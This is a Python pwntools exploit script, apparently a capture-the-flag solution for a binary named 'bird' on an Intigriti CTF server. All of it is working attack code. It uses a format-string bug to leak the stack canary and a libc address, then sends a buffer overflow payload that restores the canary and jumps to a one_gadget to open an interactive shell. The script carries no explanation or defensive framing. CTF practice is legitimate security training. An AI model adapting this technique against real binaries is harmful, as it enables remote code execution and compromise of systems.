from pwn import *

# p = process('./bird')
# p = remote('localhost', 7777)
p = remote('bird.ctf.intigriti.io', 7777)
e = context.binary = ELF('./bird')
libc = ELF('./libc.so.6')

one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

p.sendlineafter(b'bird:', b'A'*0x40+b'!!!!!'+b'%59$p.%63$p')
p.recvuntil(b'!!!!!')
addr = p.recvline()[:-1].split(b'.')
canary = int(addr[0], 16)
libc.address = int(addr[1], 16) - (libc.symbols['__libc_start_main']+231)
print(hex(canary))
print(hex(libc.address))

payload = b'A' * 0x58
payload += p64(canary) * 2
payload += p64(libc.address + one_gadget[0])

p.sendlineafter(b'(y/n) ', payload)

p.interactive()
